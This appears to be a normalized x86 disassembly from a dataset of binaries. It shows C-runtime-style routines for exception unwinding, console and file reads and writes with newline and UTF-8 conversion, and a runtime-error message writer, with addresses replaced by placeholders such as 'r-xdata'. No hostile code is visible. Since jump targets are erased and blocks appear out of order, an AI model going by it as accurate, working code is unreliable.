push [ eax + esi * 4 ]
push esi
call sub_42b732
pop ecx
pop ecx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
lea eax [ esi + 0x10 ]
push eax
call sub_42e1f5
pop ecx
test eax eax
je r-xdata
mov edi eax
mov [ ebp - 0x1c ] edi
jmp r-xdata
push eax
push esi
call sub_42b7a0
pop ecx
pop ecx
sub_42bbd0
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_42bc60
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_436625
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_436644
jmp r-xdata
sub_42bc60
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_4234de
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_42bbd0
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_42bcc2
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_42bcf2
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push 0x0
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_42bd23
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_425eb1
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_4348c3
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
mov [ esi + 0x4 ] edi
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push esi
call sub_42c50d
pop ecx
push eax
call sub_42c410
add esp 0xc
mov [ esi + 0x4 ] eax
cmp eax edi
je r-xdata
test [ esi + 0xc ] 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
push esi
call sub_42c50d
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ esi ]
dec [ esi + 0x4 ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
mov eax [ esi + 0xc ]
test al 0x8
je r-xdata
mov eax rw-data
push esi
call sub_42c50d
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop edi
pop esi
pop ebp
retn
test eax 0x400
jne r-xdata
or [ esi + 0xc ] 0x2000
push esi
call sub_42c50d
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_42c50d
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov [ esi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_42be4e
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push 0xfffffffe
pop eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x1c ] edx
cmp esi eax
jne r-xdata
push ebx
xor ebx ebx
cmp esi ebx
jl r-xdata
call sub_425ec4
and [ eax ] 0x0
call sub_425eb1
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_425ec4
mov [ eax ] ebx
call sub_425eb1
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x9
call sub_423d36
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp esi [ rw-data ]
jb r-xdata
pop esi
leave
retn
pop ebx
mov eax esi
sar eax 0x5
push edi
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
and esi 0x1f
shl esi 0x6
add eax esi
mov cl [ eax + 0x4 ]
test cl 0x1
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_425ec4
mov [ eax ] ebx
call sub_425eb1
mov [ eax ] 0x9
jmp r-xdata
call sub_425ec4
mov [ eax ] ebx
call sub_425eb1
mov [ eax ] 0x16
mov [ ebp - 0x10 ] ebx
cmp edx ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_423d36
add esp 0x14
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
test cl 0x2
jne r-xdata
pop edi
cmp [ ebp + 0xc ] ebx
je r-xdata
mov al [ eax + 0x24 ]
add al al
sar al 0x1
mov [ ebp - 0x2 ] al
movsx eax al
dec eax
push 0x4
pop ecx
je r-xdata
mov eax edx
not eax
test al 0x1
jne r-xdata
dec eax
jne r-xdata
mov eax edx
shr eax 0x1
mov [ ebp + 0x10 ] ecx
cmp eax ecx
jb r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax edx
not eax
test al 0x1
je r-xdata
push [ ebp + 0x10 ]
call sub_428905
pop ecx
mov [ ebp - 0xc ] eax
cmp eax ebx
jne r-xdata
mov [ ebp + 0x10 ] eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
je r-xdata
and edx 0xfffffffe
mov [ ebp + 0x10 ] edx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_434725
mov ecx [ edi ]
mov [ esi + ecx + 0x28 ] eax
mov eax [ ebp - 0xc ]
add esp 0x10
mov [ esi + ecx + 0x2c ] edx
call sub_425eb1
mov [ eax ] 0xc
call sub_425ec4
mov [ eax ] 0x8
push ebx
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp + 0x10 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov cl [ ecx + 0x5 ]
cmp cl 0xa
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0x18 ]
cmp ecx ebx
jl r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_425eb1
mov [ eax ] 0x9
call sub_425ec4
mov [ eax ] esi
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
ja r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x1
mov [ esi + ecx + 0x5 ] 0xa
cmp [ ebp - 0x2 ] bl
je r-xdata
push eax
call sub_425ed7
pop ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
or [ ebp - 0x14 ] 0xffffffff
mov eax [ edi ]
add [ ebp - 0x10 ] ecx
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x80
je r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x25 ]
cmp cl 0xa
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xfffffffe
jne r-xdata
push eax
call sub_424869
pop ecx
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0xc ]
je r-xdata
cmp [ ebp - 0x2 ] 0x2
je r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
cmp ecx ebx
je r-xdata
cmp ecx ebx
je r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] 0x2
mov [ esi + ecx + 0x25 ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x26 ]
cmp cl 0xa
je r-xdata
sub ebx [ ebp - 0xc ]
mov [ ebp - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x10 ]
movzx ecx [ eax ]
cmp cx 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
mov eax ebx
sub eax [ ebp - 0xc ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ecx ]
cmp al 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov ecx [ edi ]
lea esi [ esi + ecx + 0x4 ]
test [ esi ] 0x40
jne r-xdata
cmp cx 0xd
je r-xdata
mov ebx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0x10 ] eax
cmp ebx eax
jae r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov ebx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0x10 ] eax
cmp ebx eax
jae r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x3
mov [ esi + ecx + 0x26 ] 0xa
mov ax [ eax ]
mov [ ebx ] ax
inc ebx
inc ebx
or [ esi ] 0x2
jmp r-xdata
mov ecx [ ebp - 0x10 ]
add ecx 0xfffffffe
cmp eax ecx
jae r-xdata
mov [ ebx ] cx
inc ebx
inc ebx
inc eax
inc eax
mov [ ebp + 0x10 ] eax
jmp r-xdata
dec ebx
mov cl [ ebx ]
test cl cl
js r-xdata
mov al [ ecx ]
mov [ ebx ] al
inc ebx
or [ eax ] 0x2
jmp r-xdata
mov eax [ ebp - 0x10 ]
dec eax
cmp ecx eax
jae r-xdata
mov [ ebx ] al
inc ebx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add [ ebp + 0x10 ] 0x2
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea ecx [ eax + 0x2 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
xor eax eax
inc eax
movzx ecx cl
jmp r-xdata
inc ebx
jmp r-xdata
inc [ ebp + 0x10 ]
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add eax 0x4
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ecx + rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
sub ebx [ ebp - 0xc ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
push ebx
push [ ebp - 0xc ]
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x10 ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
inc ecx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
push 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
pop eax
mov [ ebx ] ax
cmp eax 0x4
jg r-xdata
mov dl [ ebx ]
movzx ecx dl
movsx ecx [ ecx + rw-data ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ edi ]
xor ecx ecx
cmp eax ebx
setne cl
add eax eax
mov [ ebp - 0x10 ] eax
mov [ esi + edx + 0x30 ] ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebx ] 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
inc ebx
cmp ebx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp ebx [ ebp - 0xc ]
jb r-xdata
inc ecx
cmp ecx eax
jne r-xdata
call sub_425eb1
mov [ eax ] 0x2a
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_434725
add esp 0x10
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
push 0xa
jmp r-xdata
push 0xd
pop eax
mov [ ebx ] ax
mov eax [ edi ]
mov cl [ ebp - 0x8 ]
mov [ esi + eax + 0x5 ] cl
mov eax [ edi ]
mov cl [ ebp - 0x7 ]
mov [ esi + eax + 0x25 ] cl
mov eax [ edi ]
mov [ esi + eax + 0x26 ] 0xa
jmp r-xdata
dec ebx
movzx ecx [ ebx ]
inc eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
je r-xdata
add ebx eax
jmp r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_434725
add esp 0x10
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
mov cl [ ebp - 0x1 ]
mov [ esi + eax + 0x5 ] cl
jmp r-xdata
inc ebx
inc ebx
neg eax
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_434725
add esp 0x10
inc ebx
cmp eax 0x2
mov [ ecx + 0x5 ] dl
jl r-xdata
cmp eax 0x3
jne r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x25 ] dl
inc ebx
sub ebx eax
jmp r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x26 ] dl
inc ebx
sub_42c410
push 0x10
push r--data
call sub_42b398
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor esi esi
cmp eax esi
jl r-xdata
call sub_425ec4
and [ eax ] 0x0
call sub_425eb1
mov [ eax ] 0x9
call sub_425ec4
mov [ eax ] esi
call sub_425eb1
mov [ eax ] 0x9
cmp eax [ rw-data ]
jb r-xdata
call sub_42b3dd
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov edi eax
and edi 0x1f
shl edi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + edi + 0x4 ]
and ecx 0x1
je r-xdata
mov ecx 0x7fffffff
cmp ecx [ ebp + 0x10 ]
sbb ecx ecx
inc ecx
jne r-xdata
push eax
call sub_4367c5
pop ecx
mov [ ebp - 0x4 ] esi
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_425ec4
mov [ eax ] esi
call sub_425eb1
mov [ eax ] 0x16
jmp r-xdata
call sub_425eb1
mov [ eax ] 0x9
call sub_425ec4
mov [ eax ] esi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42be4e
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_423d36
add esp 0x14
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42c503
mov eax [ ebp - 0x1c ]
sub_42c50d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov eax [ eax + 0x10 ]
call sub_425eb1
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
sub_42c53f
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
xor esi esi
xor edi edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jae r-xdata
inc edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jb r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x3
call sub_436b8f
pop ecx
cmp eax 0x1
je r-xdata
cmp ebx [ edi * 8 + rw-data ]
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
push 0x3
call sub_436b8f
pop ecx
test eax eax
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
lea esi [ edi * 8 + rw-data ]
push [ esi ]
call sub_4258f0
pop ecx
push eax
push [ esi ]
push ebx
call [ WriteFile@IAT ]
push r--data
mov ebx 0x314
push ebx
mov edi rw-data
push edi
call sub_42aae1
add esp 0xc
test eax eax
je r-xdata
push 0x104
mov esi rw-data
push esi
push 0x0
mov [ rw-data ] 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_423c0e
add esp 0x14
push esi
call sub_4258f0
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push 0x2fb
push esi
call sub_42aae1
add esp 0xc
test eax eax
je r-xdata
xor esi esi
push esi
call sub_4258f0
sub esi 0x3b
add eax esi
push 0x3
mov ecx rw-data
push r--data
sub ecx eax
push ecx
push eax
call sub_4318da
add esp 0x14
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_423c0e
add esp 0x14
mov eax [ ebp - 0x4 ]
push [ eax * 8 + rw-data ]
push ebx
push edi
call sub_431866
add esp 0xc
test eax eax
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_423c0e
add esp 0x14
xor esi esi
push esi
push esi
push esi
push esi
push esi
call sub_423c0e
add esp 0x14
jmp r-xdata
push 0x12010
push r--data
push edi
call sub_436a26
add esp 0xc
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_423c0e
add esp 0x14
push r--data
push ebx
push edi
call sub_431866
add esp 0xc
test eax eax
je r-xdata
sub_42c6ea
push 0x3
call sub_436b8f
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_42c53f
push 0xff
call sub_42c53f
pop ecx
pop ecx
push 0x3
call sub_436b8f
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_42c723
mov edi edi
push ebp
mov ebp esp
sub esp 0x94
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x18 ]
xor ebx ebx
cmp [ ebp + 0xc ] 0x1
push edi
mov [ ebp - 0x8c ] eax
mov [ ebp - 0x94 ] esi
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
push ebx
push 0x80
lea edi [ ebp - 0x84 ]
mov ecx edi
push ecx
push [ ebp + 0x14 ]
mov [ ebp - 0x88 ] ebx
push [ ebp + 0x10 ]
push eax
call sub_436d4d
mov esi eax
add esp 0x18
cmp esi ebx
jne r-xdata
or eax 0xffffffff
push ebx
push 0x4
mov edi rw-data
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call sub_436bda
add esp 0x18
test eax eax
je r-xdata
push 0x1
push esi
call sub_42894a
pop ecx
pop ecx
mov ecx [ ebp - 0x94 ]
mov [ ecx ] eax
cmp eax ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
mov [ esi ] bl
lea ecx [ esi - 0x1 ]
push ecx
push edi
push esi
push eax
call sub_4318da
add esp 0x10
test eax eax
je r-xdata
cmp [ ebp - 0x88 ] ebx
je r-xdata
push ebx
push ebx
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x8c ]
call sub_436d4d
add esp 0x18
mov [ ebp - 0x90 ] eax
cmp eax ebx
je r-xdata
xor eax eax
jmp r-xdata
mov al [ esi ]
mov cl 0xa
imul cl
add al bl
sub al 0x30
inc edi
inc edi
cmp edi rw-data
mov [ esi ] al
jl r-xdata
cmp [ ebp - 0x88 ] ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_423c0e
add esp 0x14
push edi
call sub_424869
pop ecx
xor esi esi
inc esi
push esi
push eax
call sub_42894a
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4234de
leave
retn
mov bl [ edi ]
movzx eax bl
push eax
call sub_424dd4
pop ecx
test eax eax
je r-xdata
jmp r-xdata
push edi
call sub_424869
pop ecx
push ebx
push [ ebp - 0x90 ]
mov [ ebp - 0x88 ] esi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x8c ]
call sub_436d4d
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
sub_42c8b1
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_436f80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
xor esi esi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] esi
mov [ ebp - 0x1ad0 ] esi
cmp [ ebp + 0x10 ] esi
jne r-xdata
cmp eax esi
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
push edi
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
lea esi [ eax * 4 + rw-data ]
mov eax [ esi ]
and edi 0x1f
shl edi 0x6
add eax edi
mov bl [ eax + 0x24 ]
add bl bl
sar bl 0x1
mov [ ebp - 0x1ad8 ] esi
mov [ ebp - 0x1ad9 ] bl
cmp bl 0x2
je r-xdata
call sub_425ec4
mov [ eax ] esi
call sub_425eb1
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_4234de
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp bl 0x1
jne r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
call sub_425ec4
xor esi esi
mov [ eax ] esi
call sub_425eb1
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
jmp r-xdata
push [ ebp + 0x8 ]
call sub_43490c
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_434725
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ esi ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop edi
pop ebx
push 0x0
lea ecx [ ebp - 0x1ad4 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac0 ] ecx
test bl bl
jne r-xdata
call sub_42a735
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae4 ]
sete cl
push eax
mov eax [ esi ]
push [ edi + eax ]
mov [ ebp - 0x1ae0 ] ecx
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
mov eax [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
mov [ ebp - 0x1abc ] eax
cmp bl 0x2
jne r-xdata
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
xor ecx ecx
cmp [ ebp - 0x1ae0 ] ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1ac0 ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ esi ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
jmp r-xdata
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae4 ] eax
xor eax eax
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
test bl bl
je r-xdata
mov esi [ ebp - 0x1ad8 ]
push 0x5
pop esi
cmp [ ebp - 0x1ac0 ] esi
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
jmp r-xdata
call sub_425eb1
mov [ eax ] 0x1c
call sub_425ec4
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov ecx [ ebp - 0x1ac4 ]
and [ ebp - 0x1abc ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
mov [ ebp - 0x1abc ] eax
mov eax [ esi ]
add eax edi
test [ eax + 0x4 ] 0x80
je r-xdata
push [ ebp - 0x1ac0 ]
call sub_425ed7
pop ecx
jmp r-xdata
call sub_425eb1
mov [ eax ] 0x9
call sub_425ec4
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1abc ]
movzx edx [ edx ]
add [ ebp - 0x1abc ] esi
add ecx esi
cmp dx 0xa
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
xor eax eax
jmp r-xdata
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1ac4 ]
inc [ ebp - 0x1ac4 ]
mov dl [ edx ]
inc ecx
cmp dl 0xa
jne r-xdata
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1ad8 ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae0 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac4 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac4 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac4 ] esi
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1abc ]
add [ ebp - 0x1abc ] 0x2
movzx edx [ edx ]
inc ecx
inc ecx
cmp dx 0xa
jne r-xdata
